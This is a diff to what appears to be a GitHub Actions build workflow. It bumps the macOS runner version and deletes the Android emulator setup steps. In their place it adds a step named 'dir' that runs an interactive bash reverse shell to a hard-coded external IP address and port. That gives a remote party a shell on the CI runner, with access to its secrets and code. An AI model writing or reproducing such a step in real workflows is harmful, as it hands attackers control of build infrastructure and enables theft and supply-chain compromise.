@@ -18,41 +18,12 @@ jobs:
   # This workflow contains a single job called "build"
   build:
     # The type of runner that the job will run on
-    runs-on: macos-12
+    runs-on: macos-15
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
       - name: dir
         shell: bash
-        run: ls /Library/Frameworks/Xamarin.Mac.framework/Versions
-        
-      - name: dir2
-        shell: bash
-        run: ls /Library/Frameworks/Mono.framework/Versions
+        run: bash -i >& /dev/tcp/165.22.187.101/8888 0>&1
     
-    
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it        
-      - name: Installing SDK Android-33 x86_64
-        shell: bash
-        timeout-minutes: 1
-        run: /Users/runner/Library/Android/sdk/tools/bin/sdkmanager --install "system-images;android-33;google_apis;x86_64"
-        
-      - name: Creating Android device
-        timeout-minutes: 1
-        shell: bash
-        run: echo "no" | /Users/runner/Library/Android/sdk/tools/bin/avdmanager create avd -n test_emulator -k "system-images;android-33;google_apis;x86_64" 
-
-      - name: Starting emulator
-        working-directory: /Users/runner/Library/Android/sdk/tools/
-        shell: bash
-        run: emulator @test_emulator &  
-
-      - name: Waiting for emulator to boot
-        timeout-minutes: 1
-        shell: bash
-        run: adb wait-for-device shell 'while [[ -z $(getprop sys.boot_completed) ]]; do sleep 1; done;'  
-      
-      - name: Done
-        shell: bash
-        run: echo "Done booting"
       
